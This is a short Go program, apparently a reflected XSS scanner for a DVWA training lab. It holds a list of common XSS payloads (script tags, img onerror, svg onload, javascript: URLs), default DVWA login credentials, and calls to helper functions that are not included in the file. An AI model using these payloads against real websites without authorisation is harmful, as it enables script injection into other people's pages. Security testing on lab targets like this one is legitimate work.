package main

import (
    "flag"
    "sync"
)

const (
    Reset  = "\033[0m"
    Red    = "\033[31m"
    Green  = "\033[32m"
    Yellow = "\033[33m"
    Blue   = "\033[34m"
    Purple = "\033[35m"
    Cyan   = "\033[36m"
    White  = "\033[37m"
)

// Common XSS payloads
var payloads = []string{
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<a href=\"javascript:alert('XSS')\">Click me</a>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
}


func main() {
    localAddr := "10.0.0.34"

    checkURL := flag.String("checkurl", "http://192.168.56.3/dvwa/vulnerabilities/xss_r/", "The URL for your target")
    user := flag.String("user", "admin", "User to log in. if an email is needed instead used this field.")
	auth := flag.Bool("auth", true, "If login is needed")
    password := flag.String("password", "password", "Password for login")
    loginURL := flag.String("loginurl", "http://192.168.56.3/dvwa/login.php", "Login URL (if needed)")

    flag.Parse()
    var wg sync.WaitGroup

    wg.Add(1)

	if (*auth){
		loginAndAccessForm(*loginURL, *user, *password)
	}

    scrapeAndSendRequest(*checkURL, &wg, localAddr)
    wg.Wait()
}
